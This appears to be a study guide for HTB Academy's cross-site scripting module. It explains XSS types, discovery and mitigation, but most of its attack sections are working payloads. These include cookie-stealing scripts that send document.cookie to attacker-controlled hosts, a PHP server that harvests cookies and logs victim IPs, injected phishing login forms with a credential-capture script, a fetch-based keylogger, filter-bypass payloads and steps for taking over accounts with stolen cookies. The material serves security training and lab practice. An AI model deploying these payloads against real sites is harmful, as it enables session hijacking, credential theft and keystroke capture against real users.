# Cross-Site Scripting (XSS) - HTB Academy Guide

## Overview

Cross-Site Scripting (XSS) is a web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. XSS occurs when user input is not properly sanitized and gets executed as JavaScript code in the victim's browser.

**Impact:**
- **Session hijacking** - Stealing authentication cookies
- **Credential theft** - Capturing login credentials via fake forms
- **Data exfiltration** - Accessing sensitive information
- **Website defacement** - Modifying page content
- **Phishing attacks** - Redirecting users to malicious sites
- **Malware distribution** - Downloading malicious files

---

## Types of XSS Vulnerabilities

### 1. Stored XSS (Persistent XSS)

**Most Critical Type** - The injected payload gets stored in the back-end database and affects all users who visit the page.

#### Characteristics:
- **Persistent** - Payload remains after page refresh
- **Wide impact** - Affects all users visiting the page
- **Database storage** - Payload stored in backend database
- **Hard to remove** - Requires database cleanup

#### Example Scenario:
```html
<!-- User input stored in database -->
Username: <script>alert(document.cookie)</script>

<!-- Later displayed to all users -->
<div>Welcome <script>alert(document.cookie)</script></div>
```

#### Testing Method:
1. Submit XSS payload through input form
2. Refresh page to confirm persistence
3. Check if other users see the same payload

---

### 2. Reflected XSS (Non-Persistent XSS)

**Temporary XSS** - Input gets processed by back-end server and returned without proper sanitization.

#### Characteristics:
- **Non-persistent** - Only affects targeted user
- **Server processing** - Input reaches back-end server
- **URL parameters** - Often exploited through GET requests
- **Temporary messages** - Common in error messages

#### Example Scenario:
```html
<!-- User input in URL -->
http://target.com/search?q=<script>alert(window.origin)</script>

<!-- Server reflects input in error message -->
<div>Search results for: <script>alert(window.origin)</script></div>
```

#### Attack Vector:
```bash
# Crafted malicious URL sent to victim
http://target.com/index.php?task=<script>alert(window.origin)</script>
```

---

### 3. DOM-based XSS (Client-Side XSS)

**Client-side processing** - Completely processed on the browser through JavaScript, never reaches back-end server.

#### Characteristics:
- **Client-side only** - Never reaches backend server
- **JavaScript processing** - Uses Document Object Model (DOM)
- **No HTTP requests** - Processing happens in browser
- **URL fragments** - Often uses # parameters

#### Source and Sink Concept:

**Source** - JavaScript object that takes user input:
- URL parameters
- Input fields
- Hash fragments
- localStorage/sessionStorage

**Sink** - Function that writes to DOM objects:
```javascript
// Vulnerable functions
document.write()
DOM.innerHTML
DOM.outerHTML

// jQuery functions
add()
after()
append()
```

#### Example Vulnerable Code:
```javascript
// Source - getting user input
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// Sink - writing to DOM without sanitization
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

#### DOM XSS Payload:
```html
<!-- innerHTML doesn't execute <script> tags -->
<img src="" onerror=alert(window.origin)>
```

---

## Basic XSS Testing Payloads

### Standard Payloads

**Basic Alert Payload:**
```html
<script>alert(window.origin)</script>
```

**Cookie Stealing:**
```html
<script>alert(document.cookie)</script>
```

**Phishing Login Form Injection:**
```html
<script>document.write('<h3>Please login to continue</h3><form action=http://attacker.com><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');</script>
```

**Session Hijacking (Cookie Stealing):**
```html
<!-- Direct navigation method -->
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

<!-- Stealthy image method -->
<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>

<!-- Remote script loading -->
<script src="http://attacker.com/script.js"></script>
```

**Blind XSS Detection Payloads:**
```html
<script src=http://attacker.com/fieldname></script>
'><script src=http://attacker.com/fieldname></script>
"><script src=http://attacker.com/fieldname></script>
<script>$.getScript("http://attacker.com/fieldname")</script>
```

**Alternative Payloads (when <script> is blocked):**
```html
<!-- Image onerror event -->
<img src="" onerror=alert(window.origin)>

<!-- Plaintext rendering -->
<plaintext>

<!-- Print dialog -->
<script>print()</script>

<!-- SVG payload -->
<svg onload=alert(window.origin)>

<!-- Input onfocus -->
<input autofocus onfocus=alert(window.origin)>
```

### Advanced Payloads

**Event Handlers:**
```html
<body onload=alert(1)>
<div onmouseover=alert(1)>
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
```

**Without Parentheses:**
```html
<script>alert`1`</script>
<script>eval('alert\u00281\u0029')</script>
```

**Encoded Payloads:**
```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode encoding -->
<script>alert('\u0058\u0053\u0053')</script>
```

---

## XSS Discovery Methods

### 1. Automated Discovery

**Open-Source Tools:**
```bash
# XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://target.com/index.php?param=test"

# Brute XSS
git clone https://github.com/rajeshmajumdar/BruteXSS.git

# XSSer
apt install xsser
xsser -u "http://target.com/search?q=XSS"
```

**Commercial Scanners:**
- Burp Suite Professional
- Nessus
- OWASP ZAP
- Acunetix

### 2. Manual Discovery

**Testing Approach:**
1. **Identify input points** - All user inputs, not just forms
2. **Submit test payload** - Use basic `<script>alert(1)</script>`
3. **Analyze response** - Check page source for payload
4. **Verify execution** - Confirm JavaScript execution
5. **Test variations** - Try different payload types

**Input Points to Test:**
- HTML form fields
- URL parameters (GET)
- HTTP headers (User-Agent, Cookie, Referer)
- JSON/XML parameters
- File upload fields
- Search functionality

### 3. Code Review

**Frontend Code Review:**
```javascript
// Look for dangerous functions
document.write()
element.innerHTML = userInput
element.outerHTML = userInput
eval(userInput)

// jQuery dangerous functions
$(element).html(userInput)
$(element).append(userInput)
```

**Backend Code Review:**
```php
// PHP - Look for unescaped output
echo $_GET['input'];
echo $_POST['data'];

// No sanitization functions
htmlspecialchars()
htmlentities()
filter_var()
```

---

## Common XSS Attack Scenarios

### 1. Session Hijacking & Cookie Stealing

**Overview:**
Session hijacking allows attackers to steal user authentication cookies through XSS, gaining unauthorized access to victim accounts without knowing their credentials.

#### Blind XSS Detection

**What is Blind XSS?**
Blind XSS occurs when the vulnerability is triggered on a page we don't have access to (e.g., Admin panels, contact forms, support tickets).

**Common Blind XSS Targets:**
- Contact Forms
- Reviews 
- User Details
- Support Tickets
- HTTP User-Agent header

**Remote Script Loading for Detection:**
```html
<!-- Basic remote script loading -->
<script src="http://YOUR_IP/script.js"></script>

<!-- Field-specific detection -->
<script src="http://YOUR_IP/fullname"></script>  <!-- for fullname field -->
<script src="http://YOUR_IP/username"></script>  <!-- for username field -->
<script src="http://YOUR_IP/website"></script>   <!-- for website field -->
```

**Blind XSS Detection Payloads:**
```html
<script src=http://YOUR_IP></script>
'><script src=http://YOUR_IP></script>
"><script src=http://YOUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://YOUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//YOUR_IP");a.send();</script>
<script>$.getScript("http://YOUR_IP")</script>
```

#### Complete Session Hijacking Workflow

**Step 1: Setup Server for Detection**
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

**Step 2: Test Blind XSS Payloads**
```html
# Submit different payloads in each field:
<script src=http://10.10.14.55/fullname></script>
<script src=http://10.10.14.55/username></script>
<script src=http://10.10.14.55/website></script>
```

**Step 3: Create Cookie Stealing Script**
Create `script.js`:
```javascript
new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
```

**Step 4: Create Cookie Harvesting Server**
Create `index.php`:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**Step 5: Deploy Working Payload**
```html
<!-- Use discovered vulnerable field with script.js -->
<script src=http://YOUR_IP/script.js></script>
```

**Step 6: Collect Stolen Cookies**
```bash
# Monitor server requests
tail -f /tmp/tmpserver/cookies.txt

# Example output:
# Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

**Step 7: Use Stolen Cookies**
1. Navigate to target login page
2. Open Firefox Developer Tools (Shift+F9)
3. Go to Storage tab
4. Click + to add new cookie
5. Set Name and Value from stolen cookie
6. Refresh page to access victim account

#### Alternative Cookie Stealing Methods

**Direct Navigation Method:**
```javascript
document.location='http://YOUR_IP/steal.php?cookie='+document.cookie;
```

**Image Loading Method (Stealthy):**
```javascript
new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
```

**Fetch API Method:**
```javascript
fetch('http://YOUR_IP/steal.php?cookie='+document.cookie);
```

**XMLHttpRequest Method:**
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://YOUR_IP/steal.php?cookie='+document.cookie);
xhr.send();
```

### 2. Credential Harvesting & Phishing Attack

**Basic Fake Login Form:**
```html
<script>
document.write('<h3>Please login to continue</h3>');
document.write('<form action=http://attacker.com/harvest.php>');
document.write('<input type="text" name="username" placeholder="Username">');
document.write('<input type="password" name="password" placeholder="Password">');
document.write('<input type="submit" value="Login">');
document.write('</form>');
</script>
```

### Advanced Phishing Attack (HTB Academy Style)

**Complete Phishing Payload with Form Removal:**
```html
'><script>document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

**URL Encoded Phishing Payload:**
```url
%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FATTACKER_IP%3APORT%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

**Complete Attack Workflow:**

1. **Setup Credential Harvesting Server:**
```bash
# Create server directory
mkdir /tmp/tmpserver
cd /tmp/tmpserver
```

2. **Create index.php for credential capture:**
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

3. **Start PHP listener:**
```bash
sudo php -S 0.0.0.0:80
```

4. **Craft malicious URL (example):**
```url
http://target.com/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.55%3A80%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

5. **Check captured credentials:**
```bash
cat /tmp/tmpserver/creds.txt
```

**Attack Breakdown:**
- `'>` - Escapes from image URL attribute
- `document.write()` - Injects fake login form
- `getElementById('urlform').remove()` - Removes original form to avoid suspicion
- `<!--` - Comments out remaining HTML to prevent rendering issues
- Form redirects victims back to original site after credential theft

### 3. Keylogger

**JavaScript Keylogger:**
```html
<script>
document.addEventListener('keypress', function(event) {
    fetch('http://attacker.com/keylog.php?key=' + event.key);
});
</script>
```

### 4. Page Defacement

**Modifying Page Content:**
```html
<script>
document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
</script>
```

---

## XSS Prevention and Bypass Techniques

### Common Filters and Bypasses

**Filter: Blocking `<script>` tags**
```html
<!-- Bypass with other tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```

**Filter: Blocking `alert()`**
```html
<!-- Alternative functions -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
```

**Filter: Blocking quotes**
```html
<!-- Using backticks -->
<script>alert`1`</script>

<!-- Using String.fromCharCode -->
<script>alert(String.fromCharCode(88,83,83))</script>
```

**Filter: Case-sensitive filtering**
```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

**Filter: Blocking form injection**
```html
<!-- Using DOM manipulation instead of direct HTML -->
<script>
var form = document.createElement('form');
form.action = 'http://attacker.com';
form.innerHTML = '<input name="user"><input type="password" name="pass">';
document.body.appendChild(form);
</script>
```

### HTML Context Escaping

**Escaping from different contexts:**
```html
<!-- Breaking out of attribute -->
" onmouseover="alert(1)
'><script>alert(1)</script>

<!-- Breaking out of HTML comment -->
--><script>alert(1)</script><!--

<!-- Breaking out of CDATA -->
]]><script>alert(1)</script>
```

---

## Tools and Resources

### Testing Tools
```bash
# XSStrike - Advanced XSS detection
python xsstrike.py -u "target.com" --crawl

# Burp Suite Extensions
- XSS Validator
- Retire.js
- Reflected XSS

# Browser Extensions
- XSS Ray (Chrome)
- XSS Me (Firefox)
```

### Session Hijacking Tools
```bash
# XSS Hunter - Blind XSS detection platform
https://xsshunter.com/

# PHP Cookie Harvester (create manually)
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

# Cookie Editor - Browser extension for cookie manipulation
- Cookie-Editor (Chrome/Firefox)
- EditThisCookie (Chrome)

# Netcat listener for quick testing
nc -lvnp 80
```

### Payload Repositories
- **PayloadAllTheThings** - XSS section
- **PayloadBox** - XSS payloads
- **OWASP XSS Filter Evasion** - Bypass techniques
- **PortSwigger XSS Cheat Sheet** - Browser-specific payloads

### Vulnerable Practice Sites
- **DVWA** - Damn Vulnerable Web Application
- **bWAPP** - Buggy Web Application
- **WebGoat** - OWASP WebGoat
- **XSS Game** - Google XSS Challenge

---

## Detection and Mitigation

### Security Headers
```bash
# Content Security Policy
Content-Security-Policy: default-src 'self'

# X-XSS-Protection (legacy)
X-XSS-Protection: 1; mode=block

# X-Content-Type-Options
X-Content-Type-Options: nosniff
```

### Secure Coding Practices
```javascript
// Input validation
function sanitizeInput(input) {
    return input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
}

// Output encoding
function escapeHtml(text) {
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
```

---

## HTB Academy Lab Solutions

### Question Examples

**Cookie Stealing Payload:**
```html
<script>alert(document.cookie)</script>
```

**DOM XSS with innerHTML:**
```html
<img src="" onerror=alert(document.cookie)>
```

**Reflected XSS in URL parameter:**
```bash
http://target.com/index.php?task=<script>alert(document.cookie)</script>
```

**Phishing Attack (HTB Academy Labs):**
```html
# Raw payload for phishing exercise
'><script>document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

# URL encoded for browser
http://SERVER_IP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FYOUR_IP%3APORT%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

**Session Hijacking Lab (HTB Academy):**
```bash
# Step 1: Test blind XSS detection payloads
<script src=http://YOUR_IP/fullname></script>
<script src=http://YOUR_IP/username></script>  
<script src=http://YOUR_IP/website></script>

# Step 2: Create script.js for cookie stealing
new Image().src='http://YOUR_IP/index.php?c='+document.cookie;

# Step 3: Use working payload with script.js
<script src=http://YOUR_IP/script.js></script>

# Step 4: Check stolen cookies
cat cookies.txt
# Output: Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2

# Step 5: Use cookie in Firefox Developer Tools (Shift+F9)
# Storage tab > Add cookie > Set Name: cookie, Value: f904f93c949d19d870911bf8b05fe7b2
```

**XSS Discovery Exercise Solutions:**
```bash
# Finding vulnerable parameter
# Answer: email (example from HTB labs)

# Finding XSS type  
# Answer: reflected (example from HTB labs)
```

---

## XSS Troubleshooting & Common Mistakes

### Phishing Attack Issues

**Problem: Payload not working**
```bash
# Check 1: Basic XSS first
<script>alert(1)</script>

# Check 2: Verify IP address
ip a | grep tun0
ifconfig tun0

# Check 3: URL encoding
# Use Burp Suite or online URL encoder
```

**Problem: PWNIP:PWNPO placeholders**
```html
# ❌ WRONG - Using placeholders from tutorial
action=http://PWNIP:PWNPO

# ✅ CORRECT - Using your actual IP
action=http://10.10.14.55:8080
```

**Problem: Server not receiving credentials**
```bash
# Check if PHP server is running
sudo netstat -tlnp | grep :8080

# Check server logs
tail -f /var/log/apache2/access.log

# Test with netcat first
sudo nc -lvnp 8080
```

**Problem: Form not appearing**
```html
# Debug: Check browser console (F12)
# Look for JavaScript errors

# Check page source for payload injection
View Source or Ctrl+U
```

### Session Hijacking Issues

**Problem: No requests to server during blind XSS testing**
```bash
# Check 1: Server is running
sudo php -S 0.0.0.0:80

# Check 2: Firewall allowing connections
sudo ufw allow 80

# Check 3: Test with simple HTTP request
curl http://YOUR_IP

# Check 4: Try different payload variations
'><script src=http://YOUR_IP/test></script>
"><script src=http://YOUR_IP/test></script>
```

**Problem: Script.js not loading**
```bash
# Check file exists in server directory
ls -la /tmp/tmpserver/script.js

# Check file permissions
chmod 644 script.js

# Test direct access
curl http://YOUR_IP/script.js
```

**Problem: Cookies not being captured**
```javascript
// Debug: Check if document.cookie contains anything
console.log(document.cookie);

// Alternative cookie stealing methods
new Image().src='http://YOUR_IP/test?cookie='+document.cookie;
fetch('http://YOUR_IP/steal?c='+document.cookie);
```

**Problem: Cookie injection not working**
```bash
# Check cookie format in browser
# Format should be: Name=Value
# Example: cookie=f904f93c949d19d870911bf8b05fe7b2

# Clear browser cookies first
# Then add stolen cookie
# Refresh page to test access
```

### Common Payload Encoding Issues

**URL Encoding Problems:**
```bash
# Spaces must be encoded as %20 or +
Please login to continue
# Becomes:
Please+login+to+continue

# Special characters must be encoded
< = %3C
> = %3E
" = %22
' = %27
```

**JavaScript String Escaping:**
```javascript
// ❌ WRONG - Unescaped quotes
document.write('<form action="http://attacker.com">');

// ✅ CORRECT - Escaped quotes
document.write('<form action=http://attacker.com>');
```

### Debugging XSS Payloads

**Step-by-step debugging:**
1. Test basic XSS: `<script>alert(1)</script>`
2. Test with URL parameter: `?url=<script>alert(1)</script>`
3. Check payload encoding with online tools
4. Verify server listening: `sudo php -S 0.0.0.0:8080`
5. Test credential capture with manual form submission

---

*This XSS guide covers the fundamental concepts and practical techniques from HTB Academy's Cross-Site Scripting module, providing a comprehensive resource for penetration testing and web application security assessment.* 